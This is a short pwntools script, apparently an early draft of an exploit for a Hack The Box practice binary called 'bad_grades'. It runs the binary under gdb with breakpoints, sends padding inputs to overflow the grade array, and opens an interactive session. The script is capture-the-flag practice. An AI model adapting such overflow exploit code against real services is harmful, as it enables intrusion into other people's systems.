from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./bad_grades")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/CTF/htb/bad_grades/libc.so.6"}

#p = remote("1.2.3.4", 30246)
#p = process("./restaurant")
p = gdb.debug("./bad_grades", '''
b *0x00400fd5
b *0x00401184
b *0x004010e7
b *0x4010f1
''')

payload = b''
payload += b'0' * 32
payload2 = b'1' * 8

# 2. Add New.
p.recv()
p.sendline(b'2')

# Number of Grades:
p.recv()
p.sendline(b'35')

for i in range(35):
    p.sendline(payload)

p.sendline(payload2)

p.interactive()
